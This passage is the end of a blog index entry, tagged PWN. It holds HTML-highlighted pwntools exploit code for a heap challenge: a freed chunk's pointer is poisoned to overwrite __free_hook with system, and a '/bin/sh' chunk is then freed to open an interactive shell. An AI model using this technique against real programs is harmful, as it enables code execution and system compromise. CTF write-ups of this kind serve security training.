libc_key=tagerheap_key+<span class="hljs-number">0x170</span><br>    leak(<span class="hljs-string">&quot;target libc_key:&quot;</span>,libc_key)<br>    fd = free_hook^libc_key<br><br>    dele(<span class="hljs-number">6</span>)<br>    edit(<span class="hljs-number">9</span>,p64(fd)+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    leak(<span class="hljs-string">&quot;free_hook&quot;</span>,free_hook)<br>    add(<span class="hljs-number">128</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    add(<span class="hljs-number">128</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    edit(<span class="hljs-number">11</span>,p64(sys)+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br> <br>    dele(<span class="hljs-number">6</span>)<br><br>    r.interactive()<br><br><br><br>pwn()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
